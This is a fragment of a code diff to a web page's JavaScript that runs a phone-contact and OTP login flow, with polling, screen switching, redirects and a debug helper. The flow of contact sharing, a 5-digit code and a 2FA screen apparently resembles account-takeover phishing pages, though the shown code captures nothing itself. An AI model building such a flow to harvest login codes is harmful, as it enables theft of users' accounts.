+                console.error("❌ No user ID for OTP check");
+                return;
+            }
+            
+            console.log("🔍 Checking OTP status...");
+            
+            fetch(`/api/check-otp-sent/${userId}`)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP ${response.status}`);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("📊 OTP check response:", data);
+                    
+                    if (data.success) {
+                        if (data.otp_sent && data.phone) {
+                            // OTP sent successfully
+                            console.log("✅ OTP sent successfully to:", data.phone);
+                            clearInterval(checkInterval);
+                            isProcessing = false;
+                            document.getElementById('contact-screen').classList.add('hidden');
+                            document.getElementById('otp-screen').classList.remove('hidden');
+                            document.getElementById('phone-number').textContent = data.phone;
+                            
+                            // Auto-redirect to OTP page after 2 seconds
+                            setTimeout(() => {
+                                goToOTPPage();
+                            }, 2000);
+                        } else if (data.contact_received) {
+                            // Contact received but OTP not sent yet
+                            console.log("🔄 Contact received, sending OTP...");
+                            document.getElementById('waiting-text').textContent = "Contact received! Sending OTP...";
+                        } else {
+                            // Still waiting for contact
+                            const dots = '.'.repeat((Math.floor(Date.now() / 1000) % 3) + 1);
+                            document.getElementById('waiting-text').textContent = `Waiting for contact${dots}`;
+                        }
+                    } else {
+                        // Error
+                        console.error("❌ OTP check error:", data.error);
+                        clearInterval(checkInterval);
+                        isProcessing = false;
+                        document.getElementById('contact-error').textContent = data.error || "Failed to process contact";
+                        document.getElementById('contact-error').classList.add('show');
+                    }
+                })
+                .catch(error => {
+                    console.error("❌ OTP check network error:", error);
+                });
+        }
+        
+        function goToOTPPage() {
+            console.log("➡️ Redirecting to OTP page for user:", userId);
+            window.location.href = `/otp?user_id=${userId}`;
+        }
+        
+        function goBack() {
+            console.log("↩️ Going back to initial screen");
+            clearInterval(checkInterval);
+            isProcessing = false;
+            document.getElementById('contact-screen').classList.add('hidden');
+            document.getElementById('otp-screen').classList.add('hidden');
+            document.getElementById('initial-screen').classList.remove('hidden');
         }
         
         function showError(message) {
+            console.error("❌ Error:", message);
             const errorEl = document.getElementById('error-message');
             errorEl.textContent = message;
             errorEl.classList.add('show');
@@ -602,63 +457,31 @@
             }, 5000);
         }
         
-        function showWarning(message) {
-            const warningEl = document.getElementById('warning-message');
-            warningEl.textContent = message;
-            warningEl.classList.add('show');
+        function showSuccess(message) {
+            console.log("✅ Success:", message);
+            const successEl = document.getElementById('success-message');
+            successEl.textContent = message;
+            successEl.classList.add('show');
             
             // Auto-hide after 3 seconds
             setTimeout(() => {
-                warningEl.classList.remove('show');
+                successEl.classList.remove('show');
             }, 3000);
         }
         
-        function showErrorScreen(message) {
-            document.getElementById('error-detail').textContent = message;
-            document.getElementById('otp-screen').classList.add('hidden');
-            document.getElementById('twofa-screen').classList.add('hidden');
-            document.getElementById('loading-screen').classList.add('hidden');
-            document.getElementById('success-screen').classList.add('hidden');
-            document.getElementById('error-screen').classList.remove('hidden');
-        }
-        
-        // Keyboard shortcuts
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter') {
-                if (!document.getElementById('otp-screen').classList.contains('hidden') && otpCode.length === 5) {
-                    verifyOTP();
-                } else if (!document.getElementById('twofa-screen').classList.contains('hidden')) {
-                    verify2FA();
-                }
+        // For testing
+        window.debug = {
+            userId: () => userId,
+            simulateContact: () => {
+                console.log("🧪 Simulating contact sharing");
+                document.getElementById('initial-screen').classList.add('hidden');
+                document.getElementById('contact-screen').classList.remove('hidden');
+                startCheckingOTPStatus();
             }
-            
-            // Escape to go back
-            if (event.key === 'Escape') {
-                if (!document.getElementById('twofa-screen').classList.contains('hidden')) {
-                    showOTPScreen();
-                }
-            }
-        });
-        
-        // Add click outside to clear error
-        document.addEventListener('click', function(event) {
-            const errorEl = document.getElementById('error-message');
-            const warningEl = document.getElementById('warning-message');
-            const twofaErrorEl = document.getElementById('twofa-error');
-            
-            if (errorEl.classList.contains('show')) {
-                errorEl.classList.remove('show');
-            }
-            if (warningEl.classList.contains('show')) {
-                warningEl.classList.remove('show');
-            }
-            if (twofaErrorEl.classList.contains('show')) {
-                twofaErrorEl.classList.remove('show');
-            }
-        });
+        };
     </script>
     
     <!-- Font Awesome for icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </body>
-    </html>
+</html>
